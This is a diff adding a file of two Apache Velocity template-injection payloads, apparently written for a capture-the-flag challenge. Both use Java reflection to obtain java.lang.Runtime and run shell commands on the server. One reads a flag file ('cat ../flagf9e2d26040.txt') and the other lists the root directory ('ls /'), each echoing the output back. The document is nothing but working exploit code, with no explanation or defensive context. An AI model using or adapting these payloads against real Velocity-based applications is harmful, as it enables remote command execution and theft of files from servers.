@@ -1,0 +1,39 @@
+text=#set($x='')
+
+
+
+#set($rt=$x.class.forName('java.lang.Runtime'))
+
+
+
+#set($chr=$x.class.forName('java.lang.Character'))
+
+
+
+#set($str=$x.class.forName('java.lang.String'))
+
+
+
+#set($ex=$rt.getRuntime().exec('cat ../flagf9e2d26040.txt'))
+
+
+
+$ex.waitFor()
+
+
+
+#set($out=$ex.getInputStream())
+
+
+
+#foreach($i in [1..$out.available()])
+
+
+
+    $str.valueOf($chr.toChars($out.read()))
+
+
+
+#end
+
+text=text=#set($str = "") #set($runtime = $str.getClass().forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null, null)) #set($listFilesCmd = "ls /") #set($process = $runtime.exec($listFilesCmd)) #set($scanner = $str.getClass().forName("java.util.Scanner").getConstructor($str.getClass().forName("java.io.InputStream")).newInstance($process.getInputStream())) #set($files = "") #set($file = $scanner.nextLine()) $file #set($file = $scanner.nextLine()) $file #set($file = $scanner.nextLine()) $file #set($file = $scanner.nextLine()) $file #set($file = $scanner.nextLine()) $file #set($file = $scanner.nextLine()) $file #set($file = $scanner.nextLine()) $file #set($file = $scanner.nextLine()) $file
